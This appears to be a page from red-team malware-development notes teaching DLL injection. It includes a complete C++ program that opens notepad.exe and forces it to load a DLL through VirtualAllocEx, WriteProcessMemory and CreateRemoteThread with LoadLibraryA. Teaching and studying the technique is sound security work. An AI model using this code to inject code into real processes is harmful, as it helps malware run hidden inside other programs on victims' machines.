---
title: DLL Injection
category: Maldev-Code Injection
order: 3
---

DLL injection is a technique used for running code within the address space of another process by forcing it to load a dynamic-link library.

It is similar concept to payload injection, but instead to inject the shellcode we are going to inject the dll module on the disk. The dll should be stored on the filesystem, the dropper can implment a download from a server or simply write it to disk manually.

In this technique we are going to create a empty buffer on the target proccess with `VirtualAllocEx` but instead of allocate the payload it will allocate the path of our dll with `WriteProcessMemory`. The reason to store the dll on a disk is because the process needs to use the system loader to initialize it properly.

With `LoadLibraryA` we can load the library on the remote process. To do that we just need to create a remote thread in the target process which calls `LoadLibraryA` with our dllpath as an argument.

If `kernel32.dll` is loaded on the loader we can use `GetProcAddress` to get `LoadLibraryA` address.

```cpp
int main(int argc, char *argv[]) {
    
    HANDLE pHandle;
    PVOID remBuf;
    PTHREAD_START_ROUTINE pLoadLibrary = NULL;
    char dllname[] = "C:\\Tools\\rtnotes\\rtnotes.dll";
    char target[] = "notepad.exe";
    int pid = 0;
    
    
    pid = FindProcess(target);
    if ( pid == 0) {
        printf("Target NOT FOUND! Exiting.\n");
        return -1;
    }

    printf("Target PID: [ %d ]\nInjecting...", pid);

    pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

    if (pHandle != NULL) {
        remBuf = VirtualAllocEx(pHandle, NULL, sizeof(dllname), MEM_COMMIT, PAGE_READWRITE); 
    
        WriteProcessMemory(pHandle, remBuf, (LPVOID) dllname, sizeof(dllname), NULL);

        CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, remBuf, 0, NULL);
        printf("done!\nremBuf addr = %p\n", remBuf);

        CloseHandle(pHandle); 
    }
    else {
        printf("OpenProcess failed! Exiting.\n");
        return -1;
    }
    return 0
}
```

Here we can see how the payload is executed.

![](/rtnotes/images/dll-injection-01.png)

The `rtnotes.dll` malicious dll was successfully loaded on the remote process `notepad.exe`.

![](/rtnotes/images/dll-injection-02.png)